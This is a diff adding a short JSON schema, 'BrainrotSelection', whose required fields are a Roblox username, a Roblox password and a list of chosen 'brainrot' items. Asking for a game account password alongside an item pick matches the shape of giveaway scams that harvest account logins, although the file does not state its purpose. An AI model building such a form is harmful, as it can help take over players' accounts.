@@ -1,0 +1,26 @@
+{
+  "name": "BrainrotSelection",
+  "type": "object",
+  "properties": {
+    "username": {
+      "type": "string",
+      "description": "Roblox username"
+    },
+    "password": {
+      "type": "string",
+      "description": "Roblox password"
+    },
+    "selected_brainrots": {
+      "type": "array",
+      "items": {
+        "type": "string"
+      },
+      "description": "List of selected brainrot items"
+    }
+  },
+  "required": [
+    "username",
+    "password",
+    "selected_brainrots"
+  ]
+}
